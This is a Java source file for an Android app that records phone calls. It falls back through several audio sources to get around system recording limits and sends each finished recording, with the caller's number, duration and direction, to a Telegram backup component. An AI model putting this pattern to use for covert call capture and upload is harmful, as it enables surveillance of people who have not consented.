package s28.system.phone;

import android.content.Context;
import android.media.MediaRecorder;
import android.util.Log;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import s28.system.phone.beta.TelegramBackupManager;

public class RecordingManager {
    private static final String TAG = "RecordingManager";
    private MediaRecorder recorder;
    private boolean isRecording = false;
    private String currentFilePath;
    private String currentPhoneNumber;

    public void startRecording(Context context, String phoneNumber) {
        startRecording(context, phoneNumber, false);
    }

    public void startRecording(Context context, String phoneNumber, boolean useGoogleApi) {
        if (isRecording) return;
        this.currentPhoneNumber = phoneNumber;

        File recordDir = new File(context.getExternalFilesDir(null), "Recordings");
        if (!recordDir.exists()) {
            recordDir.mkdirs();
        }

        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
        String cleanNumber = (phoneNumber != null) ? phoneNumber.replaceAll("[^0-9]", "") : "Unknown";
        String prefix = useGoogleApi ? "GoogleRecording_" : "Recording_";
        currentFilePath = recordDir.getAbsolutePath() + "/" + prefix + cleanNumber + "_" + timeStamp + ".m4a";

        recorder = new MediaRecorder();
        
        // Prioritize VOICE_CALL and VOICE_COMMUNICATION for call recording.
        // Falling back to MIC if system restrictions prevent direct call recording.
        int[] sources = {
            MediaRecorder.AudioSource.VOICE_CALL,          // Two-way (system permitting)
            MediaRecorder.AudioSource.VOICE_COMMUNICATION, // VoIP/Communication tuned
            MediaRecorder.AudioSource.MIC,                  // Microphone (captures speaker if on)
            MediaRecorder.AudioSource.VOICE_RECOGNITION,    // High-quality mono
            MediaRecorder.AudioSource.UNPROCESSED          // Raw audio
        };

        boolean started = false;
        for (int source : sources) {
            try {
                Log.d(TAG, "Attempting to start recording with source: " + source);
                recorder.reset();
                recorder.setAudioSource(source);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                recorder.setAudioSamplingRate(44100);
                recorder.setAudioEncodingBitRate(128000);
                recorder.setOutputFile(currentFilePath);
                
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                    recorder.setPrivacySensitive(true);
                }
                
                recorder.prepare();
                recorder.start();
                started = true;
                Log.d(TAG, "Recording started successfully with source: " + source);
                break;
            } catch (Exception e) {
                Log.e(TAG, "Method failed for source " + source + ": " + e.getMessage(), e);
                // Important: Don't release here, loop will reset it
            }
        }

        if (started) {
            isRecording = true;
            Log.d(TAG, "Recording session active: " + currentFilePath);
        } else {
            Log.e(TAG, "All audio sources failed to start");
            releaseRecorder();
        }
    }

    public void startSystemRecording(Context context, String phoneNumber, int resultCode, android.content.Intent data) {
        if (isRecording) return;
        this.currentPhoneNumber = phoneNumber;

        File recordDir = new File(context.getExternalFilesDir(null), "Recordings");
        if (!recordDir.exists()) {
            recordDir.mkdirs();
        }

        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
        String cleanNumber = (phoneNumber != null) ? phoneNumber.replaceAll("[^0-9]", "") : "Unknown";
        currentFilePath = recordDir.getAbsolutePath() + "/SystemRecording_" + cleanNumber + "_" + timeStamp + ".m4a";

        android.content.Intent serviceIntent = new android.content.Intent(context, RecordingService.class);
        serviceIntent.setAction(RecordingService.ACTION_START);
        serviceIntent.putExtra(RecordingService.EXTRA_RESULT_CODE, resultCode);
        serviceIntent.putExtra(RecordingService.EXTRA_DATA, data);
        serviceIntent.putExtra(RecordingService.EXTRA_FILE_PATH, currentFilePath);

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            context.startForegroundService(serviceIntent);
        } else {
            context.startService(serviceIntent);
        }
        isRecording = true;
        Log.d(TAG, "System recording service started: " + currentFilePath);
    }

    public void stopRecording(Context context, String duration, String direction) {
        if (!isRecording) return;

        if (recorder != null) {
            try {
                recorder.stop();
            } catch (RuntimeException e) {
                Log.e(TAG, "stop() failed. Recording might be too short.", e);
            } finally {
                String finishedPath = currentFilePath;
                releaseRecorder();
                Log.d(TAG, "Recording stopped");
                
                // Trigger Telegram Backup if enabled
                if (finishedPath != null) {
                    new TelegramBackupManager(context).backupFile(finishedPath, currentPhoneNumber, duration, direction);
                }
            }
        } else {
            android.content.Intent serviceIntent = new android.content.Intent(context, RecordingService.class);
            serviceIntent.setAction(RecordingService.ACTION_STOP);
            context.startService(serviceIntent);
            
            String finishedPath = currentFilePath;
            String phoneNumber = currentPhoneNumber;
            isRecording = false;
            Log.d(TAG, "System recording service stop requested");
            
            // Trigger Telegram Backup if enabled (System recording)
            if (finishedPath != null) {
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                    new TelegramBackupManager(context).backupFile(finishedPath, phoneNumber, duration, direction);
                }, 2000);
            }
        }
    }

    private void releaseRecorder() {
        if (recorder != null) {
            try {
                recorder.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing recorder", e);
            }
            recorder = null;
        }
        isRecording = false;
    }

    public boolean isRecording() {
        return isRecording;
    }
}
